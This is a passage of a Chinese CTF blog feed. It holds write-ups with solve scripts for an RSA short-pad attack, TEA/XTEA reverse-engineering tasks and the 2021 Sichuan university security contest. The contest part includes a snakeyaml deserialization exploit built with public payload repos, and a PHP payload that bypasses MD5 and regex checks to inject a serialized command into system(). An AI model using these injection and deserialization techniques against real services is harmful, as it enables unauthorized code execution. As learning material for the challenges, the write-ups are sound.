class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># sage</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">from gmpy2 import *</span><br><span class="line"></span><br><span class="line">def short_pad_attack(c1, c2, e, n):</span><br><span class="line">    PRxy.&lt;x,y&gt; &#x3D; PolynomialRing(Zmod(n))</span><br><span class="line">    PRx.&lt;xn&gt; &#x3D; PolynomialRing(Zmod(n))</span><br><span class="line">    PRZZ.&lt;xz,yz&gt; &#x3D; PolynomialRing(Zmod(n))</span><br><span class="line"></span><br><span class="line">    g1 &#x3D; x^e - c1</span><br><span class="line">    g2 &#x3D; (x+y)^e - c2</span><br><span class="line"></span><br><span class="line">    q1 &#x3D; g1.change_ring(PRZZ)</span><br><span class="line">    q2 &#x3D; g2.change_ring(PRZZ)</span><br><span class="line"></span><br><span class="line">    h &#x3D; q2.resultant(q1)</span><br><span class="line">    h &#x3D; h.univariate_polynomial()</span><br><span class="line">    h &#x3D; h.change_ring(PRx).subs(y&#x3D;xn)</span><br><span class="line">    h &#x3D; h.monic()</span><br><span class="line"></span><br><span class="line">    kbits &#x3D; n.nbits()&#x2F;&#x2F;(2*e*e)</span><br><span class="line">    diff &#x3D; h.small_roots(X&#x3D;2^kbits, beta&#x3D;0.4)[0]  </span><br><span class="line"></span><br><span class="line">    return diff</span><br><span class="line"></span><br><span class="line">def related_message_attack(c1, c2, diff, e, n):</span><br><span class="line">    PRx.&lt;x&gt; &#x3D; PolynomialRing(Zmod(n))</span><br><span class="line">    g1 &#x3D; x^e - c1</span><br><span class="line">    g2 &#x3D; (x+diff)^e - c2</span><br><span class="line"></span><br><span class="line">    def gcd(g1, g2):</span><br><span class="line">        while g2:</span><br><span class="line">            g1, g2 &#x3D; g2, g1 % g2</span><br><span class="line">        return g1.monic()</span><br><span class="line"></span><br><span class="line">    return -gcd(g1, g2)[0]</span><br><span class="line"></span><br><span class="line">e &#x3D; 7</span><br><span class="line">n &#x3D; 91995272927105081122659192011056020468305570748555849650309966887236871318156855318666540461669669247866754568189179687694315627673545298267458869140096224628114424176937828378360997230874932015701507629238213240839370628366083111028544554453150572165461450371411341485911677167168492357154684642531577228543</span><br><span class="line">c1 &#x3D; 10186066785511829759164194803209819172224966119227668638413350199662683285189286077736537161204019147791799351066849945954518642600518196927152098131117402608793752080104402893792812059620726950782670809837962606250674588612783027976958719051829085903720655233948024280118985875980227528403883475592567727892</span><br><span class="line">c2 &#x3D; 46182103994299145562022812023438495797686077104477472631494150222038404419414100727667171290098624214113241032861128455086601197239761085752413519627251290509474327611253599768650908336142621210005389246714504358370629231557080301516460985022782887233790302054696967900384601182742759555421864610431428746119</span><br><span class="line"></span><br><span class="line">diff &#x3D; short_pad_attack(c1, c2, e, n)</span><br><span class="line">m1 &#x3D; related_message_attack(c1, c2, diff, e, n)</span><br><span class="line">print(&quot;m1 &#x3D; &quot;, m1)</span><br><span class="line">print(&quot;m2 &#x3D; &quot;, m1 + diff)</span><br><span class="line"></span><br><span class="line">c &#x3D; 78543767285872349029076059073458316000847341792088805258173041942425687239313215276670106926320359777962661495032475004417723103701253550583245518206305422982968675291500865382213182669036827898932991063338163290845510339896689210314509493839746410486257998875782496654704288722251878269643040214139429715671</span><br><span class="line">n &#x3D; 91995272927105081122659192011056020468305570748555849650309966887236871318156855318666540461669669247866754568189179687694315627673545298267458869140096224628114424176937828378360997230874932015701507629238213240839370628366083111028544554453150572165461450371411341485911677167168492357154684642531577228543</span><br><span class="line"></span><br><span class="line">assert pow(m1,7,n) &#x3D;&#x3D; c1</span><br><span class="line">assert pow(m1+diff,7,n) &#x3D;&#x3D; c2</span><br><span class="line"></span><br><span class="line">s &#x3D; m1</span><br><span class="line">e &#x3D; diff</span><br><span class="line">tmp &#x3D; s*e - 1</span><br><span class="line"></span><br><span class="line">for i in range(1,e):</span><br><span class="line">    if tmp % i &#x3D;&#x3D; 0:</span><br><span class="line">        tmp &#x3D; tmp &#x2F;&#x2F; i</span><br><span class="line">        p &#x3D; tmp - 1</span><br><span class="line">        n &#x3D; mpz(n)</span><br><span class="line">        p &#x3D; mpz(p)</span><br><span class="line">        if gmpy2.gcd(n,p) !&#x3D; 1:</span><br><span class="line">            q &#x3D; n &#x2F;&#x2F; p</span><br><span class="line">            phi &#x3D; mpz((p-1)*(q-1))</span><br><span class="line">            d &#x3D; gmpy2.invert(mpz(e),phi)</span><br><span class="line">            print(long_to_bytes(gmpy2.powmod(c,d,n)))</span><br><span class="line">            exit()</span><br><span class="line"># Neepu&#123;Have-a-g00d-day12138&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021 津门杯&amp;红帽杯re部分复现</title>
      <link href="2021/05/15/2021%20%E6%B4%A5%E9%97%A8%E6%9D%AF&amp;%E7%BA%A2%E5%B8%BD%E6%9D%AFre%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/"/>
      <url>2021/05/15/2021%20%E6%B4%A5%E9%97%A8%E6%9D%AF&amp;%E7%BA%A2%E5%B8%BD%E6%9D%AFre%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="2021-津门杯-amp-红帽杯re部分复现"><a href="#2021-津门杯-amp-红帽杯re部分复现" class="headerlink" title="2021 津门杯&amp;红帽杯re部分复现"></a>2021 津门杯&amp;红帽杯re部分复现</h1><p>在军训，比赛快结束时看了看题，做不来，完全做不来，复现学习，复现了简单的3道题，其他题确实能力还不行，下载做题工具时，还中毒了。。。。</p><h2 id="GoodRE"><a href="#GoodRE" class="headerlink" title="GoodRE"></a>GoodRE</h2><p>这个题的难点就在于函数名不知道，一个tea加密，有点不一样的是，里面的一些加，除，位移都用了一些大数函数，导致看起来不像tea加密，而且把dealt给分为了两个数的xor，特征也没有了。</p><p>ida分析<br><img src="https://i.loli.net/2021/05/14/KYqNHByAmXVe3Ib.png"><br>接下来看8个字符转16进制的函数<br><img src="https://i.loli.net/2021/05/14/sJqYBR8eIFoC9Z6.png"><br>然后就是tea内部<br><img src="https://i.loli.net/2021/05/14/wzDeEN9dbCAvtG2.png"></p><p>脚本</p><pre><code>#include&lt;stdio.h&gt;void decrypt(unsigned int *code , unsigned int *key)&#123;    unsigned int delta=0x9e3779b9;    unsigned int v0,v1,sum=0xC6EF3720,i;// sum=0xC6EF3720    v0=code[0];    v1=code[1];    for(i=0;i&lt;32;i++)    &#123;        v1-=( (v0&lt;&lt;4)+key[2] ) ^ (v0+sum) ^ ( (v0&gt;&gt;5)+key[3] );        v0-=( (v1&lt;&lt;4)+key[0] ) ^ (v1+sum) ^ ( (v1&gt;&gt;5)+key[1] );        sum-=delta;    &#125;    code[0]=v0;    code[1]=v1;    printf(&quot;%X%X&quot;,code[0],code[1]);&#125;int main()&#123;    unsigned int key[4]=&#123;17,17,17,17&#125;;    unsigned int code[8]=&#123;0x79AE1A3B,0x596080D3,0x80E03E80, 0x846C8D73, 0x21A01CF7, 0xC7CACA32, 0x45F9AC14, 0xC5F5F22F&#125;;    int i;     printf(&quot;flag&#123;&quot;);    for(i=0;i&lt;4;i++)    &#123;        decrypt(&amp;code[i*2],key);    &#125;    printf(&quot;&#125;&quot;); &#125;//flag&#123;7DEA3F6D3B3D6C0C620864ADD2FA2AE1A61F2736F0060DA0B97E8356D017CE59&#125; </code></pre><h2 id="easyRe"><a href="#easyRe" class="headerlink" title="easyRe"></a>easyRe</h2><p>这道题的考点是，爆破，z3，和c语言调用lua文件中的函数。题目给了3个文件，output.txt不知道什么用。</p><p>ida流程<br><img src="https://i.loli.net/2021/05/14/QpYv4iWIdqns2c8.png"><br>看看处理函数<br><img src="https://i.loli.net/2021/05/14/QvAet5VcZhTLNIs.png"></p><p>所以先解密my.lua文件</p><pre><code>#include&lt;stdio.h&gt;int main()&#123;    FILE *p;    char v[0x170]=&#123;0&#125;;    char m[8]=&quot;cgfffce&quot;;    int v4[3]=&#123;2,3,5&#125;;    int i;    p=fopen(&quot;my.lua&quot;,&quot;rb&quot;);    fread(&amp;v, 1, 0x16f, p);    for(i=0;i&lt;0x16f;i++)    &#123;        v[i]=v[i]^v4[i%3];    &#125;    FILE *p1 = fopen(&quot;my.txt&quot;, &quot;wb&quot;);    fwrite(&amp;v, 1, 0x16f, p1);    for(i=0;i&lt;7;i++)    &#123;        m[i]=m[i]^v4[i%3];        printf(&quot;%c&quot;,m[i]);    &#125; &#125; //adcdefg</code></pre><p>得到的my.txt，就是一个异或。</p><pre><code>function BitXOR(a,b)    local p,c=1,0    while a&gt;0 and b&gt;0 do        local ra,rb=a%2,b%2        if ra~=rb then c=c+p end        a,b,p=(a-ra)/2,(b-rb)/2,p*2    end    if a&lt;b then a=b end    while a&gt;0 do        local ra=a%2        if ra&gt;0 then c=c+p end        a,p=(a-ra)/2,p*2    end    return cendfunction adcdefg(j)      return BitXOR(5977654,j)end</code></pre><p>用z3写的python脚本如下</p><pre><code>from z3 import *code=[5977672,338,5978023,3630,5977188,524,5977313,4067,5977511,207,5973801,3662,5977375,42,5974494,8361,5978164,988,5976337,12273,5976967,6871,5979438,5916,5976793,1485,5978936,8243,5974126,3027,5969737,9510,684,5973999,3840,5978418,13036,5975191,11850,5979906,7247,5978814,12173,5976318,1252,5974940,5736,5969435,757,5973565,4036,5979036,7999,5973024,859,5973093,3278,5973550,3179,5976631,3699,5977985,373,5977828]def decode(table):    s = Solver()    flag = [BitVec((&#39;x%d&#39; % i), 8) for i in range(32)]    mid=[0]*64    for j in range(32):        for k in range(33):            mid[j+k]+=(flag[j]^table[k])            mid[j+k]=mid[j+k]^5977654    for i in range(64):        s.add(mid[i]==code[i])    if s.check() == sat:        model = s.model()        str = [chr(model[flag[i]].as_long().real) for i in range(32)]        print(&quot;&quot;.join(str))        exit()    else:        print(&quot;no_sat&quot;)def creat_seedtable(seed):    s=[0]*33    for i in range(33):        s[i]=(32310901 * seed + 1729) % 254        seed=s[i]    return sfor i in range(0xff):    table=creat_seedtable(i)    print(i)    print(table)    decode(table)//45c48cce2e2d7fbdea1afc51c7c6ad26</code></pre><h2 id="红帽杯-ezRev"><a href="#红帽杯-ezRev" class="headerlink" title="红帽杯-ezRev"></a>红帽杯-ezRev</h2><p>一个变换key的xtea加密，中间有许多错误的比较和判断，需要自己patch这些点，然后动调出key，并且里面很多函数的名称也不知道，增加了难度。</p><p>ida看流程</p><p>第一个patch，if判断<br><img src="https://i.loli.net/2021/05/14/3uIprzNvYWeBiZq.png"></p><p>第二个patch，根据动调来看，两个随机数，前一个数要大于后一个数，并且都小于10。最终来看是需要两个rand随机数必须是4,2，才能通过后面的判断。<br><img src="https://i.loli.net/2021/05/14/QAyckUsDjt87w4F.png"><br>经过不断的试rand的值，终于发现了判断的要求</p><p>假设rand1=a，rand2=b，a**b转化为2进制的长度为len1，b**a转换为2进制的长度为len2，需要满足len1&gt;&gt;2==len2&gt;&gt;2。</p><pre><code>例子1:a=8b=4len1=20len2=16不行,会exit例子2:a=4b=2len1=8len2=8ok</code></pre><p>所以当a ** b == b ** a时，是一定会满足的，但是由于有&gt;&gt;2的缘故，也不知道会不会有其他值来满足这个条件，但是4,2一定是满足的。<br><img src="https://i.loli.net/2021/05/15/iBLxrQq7n5tazZY.png"></p><p>获得key<br><img src="https://i.loli.net/2021/05/15/lsGtgIjqKFMC5Jh.png"><br>tea加密<br><img src="https://i.loli.net/2021/05/15/Ig3FkGE4X96LqO8.png"><br>解密</p><pre><code>#include&lt;stdio.h&gt;void decrypt(unsigned int r ,unsigned int *code ,unsigned int *key)&#123;    unsigned int v0,v1,i,delta=0x9e3779b9;    unsigned int sum=delta*r;    v0=code[0];    v1=code[1];    for(i=0;i&lt;r;i++)    &#123;        v1-=( ((v0&lt;&lt;4) ^(v0&gt;&gt;5)) +v0 ) ^ ( sum + key[ (sum&gt;&gt;11)&amp;3 ]);        sum-=delta;        v0-=( ((v1&lt;&lt;4) ^ (v1&gt;&gt;5)) +v1 ) ^ ( sum + key[sum&amp;3] );    &#125;    code[0]=v0;    code[1]=v1;    key[0]+=789;    key[3]+=135;    printf(&quot;%c%c&quot;,code[0],code[1]);&#125;int main()&#123;    unsigned int key[4]=&#123;0x00067932, 0x0004F765, 0x0007FAFF, 0x00067932&#125;;    unsigned int r=32;    unsigned int code[16]=&#123;0xd118c7b2,0x7fc3f3a8,0x4a19f2da,0x472469e1,0x7c682864,0x50c0e3d1,0xc595670b,0x2ee07578,0xd040a3f0,0xc5590286,0xd82b07a8,0xd5978c2c,0x4e2bc556,0x079e2e90,0xc7a353b5,0x493995B&#125;;    int i;    for(i=0;i&lt;8;i++)    &#123;        decrypt(r,&amp;code[i*2],key);    &#125;&#125; </code></pre><p>动调getflag<br><img src="https://i.loli.net/2021/05/14/hsvncStLKDgwOEp.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021 四川省大学生大赛 wp</title>
      <link href="2021/05/15/20l21%E5%B9%B4%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%20%20writeup/"/>
      <url>2021/05/15/20l21%E5%B9%B4%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%20%20writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="2021年四川省大学生网络安全技能大赛-writeup"><a href="#2021年四川省大学生网络安全技能大赛-writeup" class="headerlink" title="2021年四川省大学生网络安全技能大赛  writeup"></a>2021年四川省大学生网络安全技能大赛  writeup</h1><p>师傅们tql，排名第八，得了个证书，哈哈哈</p><h2 id="一、-战队信息"><a href="#一、-战队信息" class="headerlink" title="一、 战队信息"></a><strong>一、</strong> 战队信息</h2><p>战队名称：boy_next_the_door</p><p>战队编号：lx_31426d</p><p>所属单位：成都信息工程大学</p><p>战队成员姓名：吴昊 刘仕林 张舒</p><h2 id="二、解题情况"><a href="#二、解题情况" class="headerlink" title="二、解题情况"></a><strong>二、</strong>解题情况</h2><p><img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600366713722322944&puid=155796514" alt="image-20210515164157410"></p><p><img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600366721616007168&puid=155796514" alt="image-20210515164251587"></p><h2 id="三、-解题过程"><a href="#三、-解题过程" class="headerlink" title="三、 解题过程"></a><strong>三、</strong> 解题过程</h2><h3 id="题目一-easyyaml"><a href="#题目一-easyyaml" class="headerlink" title="题目一 easyyaml"></a>题目一 easyyaml</h3><h2 id="操作内容："><a href="#操作内容：" class="headerlink" title="操作内容："></a>操作内容：</h2><p>去网上搜索了一下别人的poc</p><p><a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p><p><a href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a></p><p><a href="https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true">https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true</a></p><p>将其更改了一下</p><p>这个题考察snakeyaml的反序列化</p><p>但是有一点需要注意的是</p><p>address类的属性ext为Object.gadget从第二个链接获取</p><p>将要执行的Java代码放入<a href="https://github.com/artsploit/yaml-payload/blob/master/src/artsploit/AwesomeScriptEngineFactory.java">AwesomeScriptEngineFactory.java中</a>并进行编译：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac src &#x2F; artsploit &#x2F; AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf yaml-payload.jar -C src &#x2F; 。</span><br></pre></td></tr></table></figure><p>然后即可进行正常的攻击</p><h3 id="flag值"><a href="#flag值" class="headerlink" title="flag值"></a>flag值</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;31df1d6dca4683ad8c27acf8c7c04326&#125;</span><br></pre></td></tr></table></figure><h3 id="题目二-papapa"><a href="#题目二-papapa" class="headerlink" title="题目二 papapa"></a>题目二 papapa</h3><h3 id="操作内容：-1"><a href="#操作内容：-1" class="headerlink" title="操作内容："></a>操作内容：</h3><p>扫描目录发现robots.txt</p><p>看robots.txt有提示main.php<br><img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600361495638425600&puid=155796514" alt="image-20210515135112692"><br><img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600361511748743168&puid=155796514" alt="image-20210515140017409"></p><p>传参a发现了加密的代码</p><p><img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600361531547430912&puid=155796514" alt="image-20210515140140792"></p><p>两次base64解码 再 16进制解码得到源码</p><p><img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600361546175598593&puid=155796514" alt="image-20210515140619900"></p><p>md5数组绕过，正则那可以-绕过，也可以用%0a绕过</p><p>然后知道了system()能命令执行</p><p>构造payload</p><p>使用ls 看到wobushif0agaaa.txt</p><p>cat这个文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F; &#39;this_is_a_easy_php&#39;</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">class NoVu &#123;</span><br><span class="line">    public $command&#x3D;&#39;cat wobushif0agaaa.txt&#39;;</span><br><span class="line">&#125;</span><br><span class="line">echo urlencode(serialize(new NoVu));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>最后的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;main.php?a[]&#x3D;1&amp;b[]&#x3D;2&amp;c&#x3D;-&amp;d&#x3D;O%3A4%3A&quot;NoVu&quot;%3A1%3A%7Bs%3A7%3A&quot;command&quot;%3Bs%3A22%3A&quot;cat+wobushif0agaaa.txt&quot;%3B%7D</span><br></pre></td></tr></table></figure><p><img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600361592707833856&puid=155796514" alt="image-20210515162112926"></p><h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F; &#39;this_is_a_easy_php&#39;</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">class NoVu &#123;</span><br><span class="line">    public $command&#x3D;&#39;cat wobushif0agaaa.txt&#39;;</span><br><span class="line">&#125;</span><br><span class="line">echo urlencode(serialize(new NoVu));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="flag值-1"><a href="#flag值-1" class="headerlink" title="flag值"></a>flag值</h3><p>flag{73ac78436f0e761123a9888bf24a5c79}</p><h3 id="题目三-Misc-我的世界"><a href="#题目三-Misc-我的世界" class="headerlink" title="题目三 Misc 我的世界"></a>题目三 Misc 我的世界</h3><h3 id="操作内容：-2"><a href="#操作内容：-2" class="headerlink" title="操作内容："></a>操作内容：</h3><p>​    下载文件后打开我的世界，发现真的是个游戏：</p><p><img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600395295299424256&puid=155796514" alt="img"><img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600395306265473024&puid=155796514" alt="img"><img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600395315130097664&puid=155796514" alt="img"><img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600395352128057344&puid=155796514" alt="img"> </p><p>​    在信标处宝箱内可以得到一本名字为flag1的书，打开后发现以上字符串，初步断定是*<strong>*栅栏加密**</strong>，先解一下，这里我用的<a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">在线工具</a>，当栏数为14时得到</p><p><img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600395134382895104&puid=155796514" alt="img"> </p><p>很像flag了，尝试提交但是不对，继续在地图内探索，在信标旁内的洞穴内发现有如下：</p><p><img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600395146786881536&puid=155796514" alt="img"><img src="file:///C:\Users\86188\AppData\Local\Temp\ksohtml26536\wps7.jpg" alt="img"> </p><p>可以看到在信标附近有异常，飞过去看，是这个：<br><img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600395384594989056&puid=155796514" alt="img"></p><p>结合flag=1+1，经过尝试得到flag，居然是把CTF515加在后面，不得不说这个题确实有点脑洞的感觉。</p><h3 id="如该题使用自己编写的脚本请详细写出，不允许截图"><a href="#如该题使用自己编写的脚本请详细写出，不允许截图" class="headerlink" title="如该题使用自己编写的脚本请详细写出，不允许截图"></a>如该题使用自己编写的脚本请详细写出，不允许截图</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">无</span><br></pre></td></tr></table></figure><p>flag值上传图片失败。错误信息： <code>Comman</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;scdxsCTF2021422CTF515&#125;</span><br></pre></td></tr></table></figure><h3 id="题目四-Misc-disk-recover"><a href="#题目四-Misc-disk-recover" class="headerlink" title="题目四 Misc disk-recover"></a>题目四 Misc disk-recover</h3><h3 id="操作内容：-3"><a href="#操作内容：-3" class="headerlink" title="操作内容："></a>操作内容：</h3><p>​    下载解压题目得到upload.pcapng文件，直接用7-Zip可以解压出一个已损坏的光盘映像文件disk-recovery.img，直接用DiskGenius恢复。</p><p>​    先打开损坏文件：</p><p>​    <img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600380549140959232&puid=155796514" alt="img"></p><p>​    再选中恢复</p><p><img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600396968641540096&puid=155796514" alt="img"> </p><p>​    得到了一个.xls文件,</p><p><img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600395191882612736&puid=155796514" alt="img"> </p><p><img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600395201071132672&puid=155796514" alt="img"> </p><p>打开就可以看到flag</p><h3 id="flag"><a href="#flag" class="headerlink" title="flag:"></a>flag:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;E7A10C15E26AA5750070EF756AAA1F7C&#125;</span><br></pre></td></tr></table></figure><h3 id="题目五-Misc-pack"><a href="#题目五-Misc-pack" class="headerlink" title="题目五 Misc pack"></a>题目五 Misc pack</h3><h3 id="操作内容"><a href="#操作内容" class="headerlink" title="操作内容:"></a>操作内容:</h3><p>ctf.exe，pe view打开，可以看到节区名错了</p><h2 id=""><a href="#" class="headerlink" title=""></a><img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600394843689156608&puid=155796514" alt="img"></h2><p>upx脱壳，脱壳先修改节区名</p><p>脱壳完后，用ResourceHacker.exe打开，看资源，得到flag分为2部分</p><p><img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600394832876240896&puid=155796514" alt="img"> </p><h3 id="脚本："><a href="#脚本：" class="headerlink" title="脚本："></a>脚本：</h3><p>无</p><h3 id="flag："><a href="#flag：" class="headerlink" title="flag："></a>flag：</h3><h3 id="flag-0bed66d154ccbdd07a6342abf97a5cfc"><a href="#flag-0bed66d154ccbdd07a6342abf97a5cfc" class="headerlink" title="flag{0bed66d154ccbdd07a6342abf97a5cfc}"></a>flag{0bed66d154ccbdd07a6342abf97a5cfc}</h3><h3 id="题目六-em0ji"><a href="#题目六-em0ji" class="headerlink" title="题目六 em0ji"></a>题目六 em0ji</h3><h3 id="操作内容：-4"><a href="#操作内容：-4" class="headerlink" title="操作内容："></a>操作内容：</h3><p>下载附件打开<br><img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600361457650434048&puid=155796514" alt="image-20210515141433133"></p><p>前面四个肯定是flag</p><p>所以借此线索进行收集</p><p>网上搜索emoji的官方网站</p><p><a href="https://www.emojiall.com/zh-hans/emoji/%F0%9F%98%81">https://www.emojiall.com/zh-hans/emoji/%F0%9F%98%81</a></p><p><img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600424269911539712&puid=155796514" alt="image-20210515203137931"></p><p>查看简短代码的首字母，拼接得到</p><p><img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600394811267547136&puid=155796514" alt="image-20210515141708869"></p><h3 id="脚本：-1"><a href="#脚本：-1" class="headerlink" title="脚本："></a>脚本：</h3><p>无</p><h3 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;emojiisverysimple&#125;</span><br></pre></td></tr></table></figure><h3 id="题目七-easy-re"><a href="#题目七-easy-re" class="headerlink" title="题目七 easy_re"></a>题目七 easy_re</h3><h3 id="操作内容：-5"><a href="#操作内容：-5" class="headerlink" title="操作内容："></a>操作内容：</h3><p>upx解壳，手动或者upx脱。</p><p>分析流程<br><img src="https://i.loli.net/2021/05/15/YJmCVrnf2sAxohM.png"><br>脚本</p><h4 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h4><pre><code>#include&lt;stdio.h&gt;int main()&#123;    char code[]=&quot;&#39;- &amp;:8.4a 3$a&amp;3$ 5```&lt;&quot;;    int i;    for(i=0;i&lt;22;i++)    &#123;        printf(&quot;%c&quot;,code[i]^0x41);    &#125;&#125;</code></pre><h3 id="flag值-2"><a href="#flag值-2" class="headerlink" title="flag值"></a>flag值</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;you are great!!!&#125;</span><br></pre></td></tr></table></figure><h3 id="题目八-easy-pyc"><a href="#题目八-easy-pyc" class="headerlink" title="题目八 easy.pyc"></a>题目八 easy.pyc</h3><h3 id="操作内容：-6"><a href="#操作内容：-6" class="headerlink" title="操作内容："></a>操作内容：</h3><p>pyc转py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uncompyle6 -o  C:\Users\hp\Downloads\easy.py C:\Users\hp\Downloads\easy.pyc</span><br></pre></td></tr></table></figure><p>然后看流程<br><img src="https://i.loli.net/2021/05/15/CAkJHtq2aBGT1DS.png"><br>脚本</p><h4 id="脚本-2"><a href="#脚本-2" class="headerlink" title="脚本"></a>脚本</h4><pre><code>import base64url = &quot;XlhlX0sMEWNiDxQQDgwTXl5eZRFgFWMOFBATXhMMYw8PD2UMZUk=&quot;str_url = base64.b64decode(url)for i in str_url:    x=(i-6)^62    print(chr(x),end=&#39;&#39;)</code></pre><h3 id="flag值-3"><a href="#flag值-3" class="headerlink" title="flag值"></a>flag值</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;85cb704683fffa5d1c6043f38c777a8a&#125;</span><br></pre></td></tr></table></figure><h3 id="题目九-base变形计-exe"><a href="#题目九-base变形计-exe" class="headerlink" title="题目九 base变形计.exe"></a>题目九 base变形计.exe</h3><h3 id="操作内容：-7"><a href="#操作内容：-7" class="headerlink" title="操作内容："></a>操作内容：</h3><p>upx脱壳<br><img src="https://i.loli.net/2021/05/15/hyj7lxopfWSiRJL.png"></p><p>先得到str2</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    int v9[]=&#123;0x00000050,0x00000067,0x00000072,0x00000062,0x00000050,0x00000019,0x00000079,0x0000001e,0x00000047,0x0000005e,0x0000004f,0x00000072,0x00000044,0x0000005d,0x0000005f,0x0000001b,0x00000044,0x00000070,0x00000062,0x00000063,0x00000047,0x0000005d,0x00000047,0x00000072,0x00000045,0x0000005e,0x00000050,0x00000063,0x00000047,0x00000070,0x0000005b,0x00000018,0x00000050,0x00000060,0x00000069,0x0000001f,0x00000053,0x0000005d,0x0000004c,0x00000066,0x00000045,0x0000005e,0x00000053,0x00000072,0x00000053,0x00000070,0x0000005b,0x0000007d,0x00000053,0x00000019,0x0000001a,0x00000017&#125;;    char str2[]=&quot;0000000000000000000000000000000000000000000000000000&quot;;    int i;    for(i=0;i&lt;=51;i++)    &#123;        str2[i]=42^v9[i];        printf(&quot;%c&quot;,str2[i]);    